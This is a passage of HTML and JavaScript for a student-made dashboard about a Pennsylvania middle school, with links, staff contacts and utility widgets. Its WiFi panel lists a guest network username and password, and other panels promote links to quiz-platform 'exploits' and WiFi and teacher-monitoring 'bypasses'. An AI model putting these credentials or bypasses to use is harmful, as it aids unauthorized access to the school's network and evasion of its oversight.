      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>
      
      <!-- NEW BUTTONS FOR NEW PANELS -->
      <button onclick="dashboard.togglePanel('reminderPanel')">⏰ Reminder System</button>
      <button onclick="dashboard.togglePanel('settingsPanel')">⚙️ Settings</button>
      <button onclick="dashboard.togglePanel('quotePanel')">💭 Daily Quote</button>
      <button onclick="dashboard.togglePanel('systemDiagPanel')">📈 System Diagnostics</button>
      <button onclick="dashboard.togglePanel('taskManagerPanel')">✅ Task Manager</button>
      <button onclick="dashboard.togglePanel('virtualAssistantPanel')">🤖 Virtual Assistant</button>
      <button onclick="dashboard.togglePanel('resourceLibraryPanel')">📚 Resource Library</button>
      <button onclick="dashboard.togglePanel('weatherPanel')">☀️ Weather Forecast</button>
      <button onclick="dashboard.togglePanel('calculatorPanel')">🔢 Calculator</button>
      <button onclick="dashboard.togglePanel('analogClockPanel')">🕰️ Analog Clock</button>
    </div>

    <!-- Information Panels -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel (Existing) -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel (Existing) -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel (Existing) -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel (Existing) -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel (Existing) -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel (Existing) -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel (Existing) -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel (Existing) -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel (Existing) -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel (Existing) -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel (Existing) -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel (Existing) -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel (Existing) -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel (Existing) -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel (Existing) -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

      <!-- NEW PANELS START HERE -->

      <!-- Reminder System Panel -->
      <div id="reminderPanel" class="info-panel">
        <h2>⏰ Reminder System</h2>
        <div class="reminder-form">
            <input type="text" id="reminderText" placeholder="Enter reminder text" />
            <input type="date" id="reminderDate" />
            <input type="time" id="reminderTime" />
            <button id="addReminderBtn">Add Reminder</button>
        </div>
        <ul id="reminderList">
            <!-- Reminders will be dynamically added here -->
        </ul>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="info-panel">
        <h2>⚙️ Settings</h2>
        
        <div class="settings-group">
            <h3>Theme & Colors</h3>
            <label for="themeToggleSettings">
                <input type="checkbox" id="themeToggleSettings" />
                <span>Enable Light Theme</span>
            </label>
            <p>Choose Accent Color:</p>
            <div class="color-picker-grid" id="accentColorPicker">
                <div class="color-box" data-color="#ff914d" style="background-color: #ff914d;"></div> <!-- Original Orange -->
                <div class="color-box" data-color="#4CAF50" style="background-color: #4CAF50;"></div> <!-- Green -->
                <div class="color-box" data-color="#2196F3" style="background-color: #2196F3;"></div> <!-- Blue -->
                <div class="color-box" data-color="#9C27B0" style="background-color: #9C27B0;"></div> <!-- Purple -->
                <div class="color-box" data-color="#FFC107" style="background-color: #FFC107;"></div> <!-- Yellow -->
                <div class="color-box" data-color="#E91E63" style="background-color: #E91E63;"></div> <!-- Pink -->
                <div class="color-box" data-color="#00BCD4" style="background-color: #00BCD4;"></div> <!-- Cyan -->
            </div>
            <button id="resetAccentColorBtn">Reset Accent Color</button>
        </div>

        <div class="settings-group">
            <h3>Display Options</h3>
            <label for="fontSizeSlider">Font Size: <span id="currentFontSize">16px</span></label>
            <input type="range" id="fontSizeSlider" min="12" max="24" value="16" />
            
            <label for="animationToggle">
                <input type="checkbox" id="animationToggle" checked />
                <span>Enable UI Animations</span>
            </label>
        </div>

        <div class="settings-group">
            <h3>Panel Management</h3>
            <p>Toggle default visibility for panels:</p>
            <!-- Dynamically generate checkboxes for all panels here -->
            <div id="panelVisibilitySettings" style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                <!-- Checkboxes will be inserted here by JS -->
            </div>
            <button id="savePanelVisibilityBtn">Save Panel Visibility</button>
        </div>
      </div>

      <!-- Daily Quote Panel -->
      <div id="quotePanel" class="info-panel">
        <h2>💭 Daily Quote</h2>
        <p id="quoteDisplay">Loading a wise thought...</p>
        <span id="quoteAuthor">- Author Unknown</span>
        <button id="newQuoteBtn">Get New Quote</button>
      </div>

      <!-- Simulated System Diagnostics Panel -->
      <div id="systemDiagPanel" class="info-panel">
        <h2>📈 System Diagnostics (Simulated)</h2>
        <div class="diagnostics-grid">
            <div class="diag-item">
                <h3>CPU Usage</h3>
                <div id="cpuUsage" class="diag-value">--%</div>
                <div class="progress-bar-container"><div id="cpuBar" class="progress-bar"></div></div>
                <div class="diag-status">Normal</div>
            </div>
            <div class="diag-item">
                <h3>RAM Usage</h3>
                <div id="ramUsage" class="diag-value">--%</div>
                <div class="progress-bar-container"><div id="ramBar" class="progress-bar"></div></div>
                <div class="diag-status">Optimal</div>
            </div>
            <div class="diag-item">
                <h3>Disk Usage</h3>
                <div id="diskUsage" class="diag-value">--%</div>
                <div class="progress-bar-container"><div id="diskBar" class="progress-bar"></div></div>
                <div class="diag-status">Healthy</div>
            </div>
            <div class="diag-item">
                <h3>Network Speed</h3>
                <div id="networkSpeed" class="diag-value">-- Mbps</div>
                <div class="progress-bar-container"><div id="networkBar" class="progress-bar"></div></div>
                <div class="diag-status">Fast</div>
            </div>
        </div>
        <p class="info-text" style="margin-top: 20px;">
            This panel provides a simulated real-time overview of system performance metrics.
            Values are generated to reflect typical system behavior under various loads.
            Actual system performance may vary.
        </p>
      </div>

      <!-- Task Manager Panel -->
      <div id="taskManagerPanel" class="info-panel">
        <h2>✅ Task Manager</h2>
        <div class="task-form">
            <input type="text" id="taskText" placeholder="Enter new task" />
            <input type="date" id="taskDueDate" />
            <select id="taskPriority">
                <option value="low">Low Priority</option>
                <option value="medium">Medium Priority</option>
                <option value="high">High Priority</option>
            </select>
            <button id="addTaskBtn">Add Task</button>
        </div>
        <ul id="taskList">
            <!-- Tasks will be dynamically added here -->
        </ul>
      </div>

      <!-- Virtual Assistant Panel -->
      <div id="virtualAssistantPanel" class="info-panel">
        <h2>🤖 Virtual Assistant</h2>
        <div id="chatBox">
            <div class="chat-message assistant">Hello! I am your Private System Assistant. How can I help you today? Try asking about the 'weather' or 'reminders'.</div>
        </div>
        <div style="display: flex; margin-top: 10px;">
            <input type="text" id="chatInput" placeholder="Type your message..." />
            <button id="sendChatBtn">Send</button>
        </div>
      </div>

      <!-- Resource Library Panel -->
      <div id="resourceLibraryPanel" class="info-panel">
        <h2>📚 Resource Library</h2>
        
        <div class="resource-category">
            <h3>Study Tools</h3>
            <ul>
                <li><a href="https://www.khanacademy.org/" target="_blank">Khan Academy</a></li>
                <li><a href="https://quizlet.com/" target="_blank">Quizlet</a></li>
                <li><a href="https://www.wolframalpha.com/" target="_blank">Wolfram Alpha</a></li>
                <li><a href="https://www.chegg.com/" target="_blank">Chegg Study</a></li>
            </ul>
        </div>
        
        <div class="resource-category">
            <h3>Career Development</h3>
            <ul>
                <li><a href="https://www.linkedin.com/" target="_blank">LinkedIn</a></li>
                <li><a href="https://www.indeed.com/" target="_blank">Indeed Job Search</a></li>
                <li><a href="https://www.glassdoor.com/" target="_blank">Glassdoor</a></li>
                <li><a href="https://www.coursera.org/" target="_blank">Coursera Online Courses</a></li>
            </ul>
        </div>

        <div class="resource-category">
            <h3>Coding & Tech</h3>
            <ul>
                <li><a href="https://www.freecodecamp.org/" target="_blank">freeCodeCamp</a></li>
                <li><a href="https://leetcode.com/" target="_blank">LeetCode</a></li>
                <li><a href="https://www.w3schools.com/" target="_blank">W3Schools</a></li>
                <li><a href="https://stackoverflow.com/" target="_blank">Stack Overflow</a></li>
            </ul>
        </div>

        <div class="resource-category">
            <h3>Creative & Design</h3>
            <ul>
                <li><a href="https://www.canva.com/" target="_blank">Canva (Graphic Design)</a></li>
                <li><a href="https://www.figma.com/" target="_blank">Figma (UI/UX Design)</a></li>
                <li><a href="https://unsplash.com/" target="_blank">Unsplash (Stock Photos)</a></li>
                <li><a href="https://www.gimp.org/" target="_blank">GIMP (Image Editor)</a></li>
            </ul>
        </div>
      </div>

      <!-- Simulated Weather Panel -->
      <div id="weatherPanel" class="info-panel">
        <h2>☀️ Weather Forecast (Simulated)</h2>
        <div class="weather-forecast-grid" id="weatherForecastGrid">
            <!-- Weather days will be dynamically inserted here -->
        </div>
        <p class="info-text" style="margin-top: 20px;">
            This weather forecast is simulated for demonstration purposes.
            It provides a general idea of weather conditions but does not reflect real-time data.
        </p>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel">
        <h2>🔢 Calculator</h2>
        <div class="calculator-grid">
            <div id="calcDisplay">0</div>
            <button class="clear" data-value="C">C</button>
            <button class="operator" data-value="neg">+/-</button>
            <button class="operator" data-value="%">%</button>
            <button class="operator" data-value="/">/</button>
            <button data-value="7">7</button>
            <button data-value="8">8</button>
            <button data-value="9">9</button>
            <button class="operator" data-value="*">x</button>
            <button data-value="4">4</button>
            <button data-value="5">5</button>
            <button data-value="6">6</button>
            <button class="operator" data-value="-">-</button>
            <button data-value="1">1</button>
            <button data-value="2">2</button>
            <button data-value="3">3</button>
            <button class="operator" data-value="+">+</button>
            <button data-value="0">0</button>
            <button data-value=".">.</button>
            <button class="equals" data-value="=">=</button>
        </div>
      </div>

      <!-- Analog Clock Panel -->
      <div id="analogClockPanel" class="info-panel">
        <h2>🕰️ Analog Clock</h2>
        <div class="analog-clock-container">
          <div id="analogClock">
            <div id="hourHand" class="hand"></div>
            <div id="minuteHand" class="hand"></div>
            <div id="secondHand" class="hand"></div>
          </div>
        </div>
        <p class="info-text" style="text-align: center;">A classic way to tell time.</p>
      </div>

      <!-- END NEW PANELS -->

    </div> <!-- End infoPanelsContainer -->

    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
  </div>

  <script>
    // Global settings and utilities for the dashboard
    const dashboard = {
      // --- Core Initialization ---
      init: function() {
        console.log("Dashboard initializing...");
        this.loadSettings(); // Load user settings first
        this.initThemeToggle(); // Initialize theme based on loaded settings
        this.applyThemeSettings(); // Apply theme, font size, animations from settings
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initButtons(); // General buttons and quick panel buttons
        this.initCanvas();
        this.initPanels(); // Setup initial state for all info panels
        this.initQuickBar(); // Quick bar related functions

        // New Feature Initializations
        this.reminders.init(); // Initialize reminder system
        this.settings.init(); // Initialize settings panel logic
        this.quotes.init(); // Initialize quote generator
        this.systemDiagnostics.init(); // Start simulated system diagnostics
        this.taskManager.init(); // Initialize task manager
        this.virtualAssistant.init(); // Initialize virtual assistant
        this.weather.init(); // Initialize simulated weather
        this.calculator.init(); // Initialize calculator
        this.analogClock.init(); // Initialize analog clock
        this.setupPanelVisibilityControls(); // Setup checkboxes in settings panel
        this.applyDefaultPanelVisibility(); // Apply user's preferred panel visibility
        console.log("Dashboard initialized successfully.");
      },

      // --- Settings Management ---
      settings: {
        currentAccentColor: localStorage.getItem('accentColor') || '#ff914d',
        animationsEnabled: JSON.parse(localStorage.getItem('animationsEnabled') ?? 'true'),
        fontSize: parseInt(localStorage.getItem('fontSize') || '16'),
        panelVisibility: JSON.parse(localStorage.getItem('panelVisibility') || '{}'),
        isLightTheme: JSON.parse(localStorage.getItem('isLightTheme') ?? 'false'), // Track theme state

        init: function() {
            console.log("Settings panel initializing...");
            // Initial setup for settings controls
            document.getElementById('themeToggleSettings').checked = dashboard.settings.isLightTheme;
            document.getElementById('animationToggle').checked = dashboard.settings.animationsEnabled;
            document.getElementById('fontSizeSlider').value = dashboard.settings.fontSize;
            document.getElementById('currentFontSize').textContent = `${dashboard.settings.fontSize}px`;

            // Event Listeners for settings controls
            document.getElementById('themeToggleSettings').addEventListener('change', (e) => {
                dashboard.settings.isLightTheme = e.target.checked;
                localStorage.setItem('isLightTheme', dashboard.settings.isLightTheme);
                dashboard.applyThemeSettings();
            });
            document.getElementById('animationToggle').addEventListener('change', (e) => {
                dashboard.settings.animationsEnabled = e.target.checked;
                localStorage.setItem('animationsEnabled', dashboard.settings.animationsEnabled);
                dashboard.applyThemeSettings(); // Re-apply to enable/disable animations
            });
            document.getElementById('fontSizeSlider').addEventListener('input', (e) => {
                dashboard.settings.fontSize = parseInt(e.target.value);
                document.getElementById('currentFontSize').textContent = `${dashboard.settings.fontSize}px`;
                localStorage.setItem('fontSize', dashboard.settings.fontSize);
                dashboard.applyThemeSettings(); // Re-apply to update font size
            });

            // Accent color picker
            document.getElementById('accentColorPicker').addEventListener('click', (e) => {
                if (e.target.classList.contains('color-box')) {
                    const newColor = e.target.dataset.color;
                    dashboard.settings.currentAccentColor = newColor;
                    localStorage.setItem('accentColor', newColor);
                    dashboard.applyThemeSettings();
                    document.querySelectorAll('.color-box').forEach(box => box.classList.remove('selected'));
                    e.target.classList.add('selected');
                }
            });

            // Reset accent color button
            document.getElementById('resetAccentColorBtn').addEventListener('click', () => {
                dashboard.settings.currentAccentColor = '#ff914d'; // Default orange
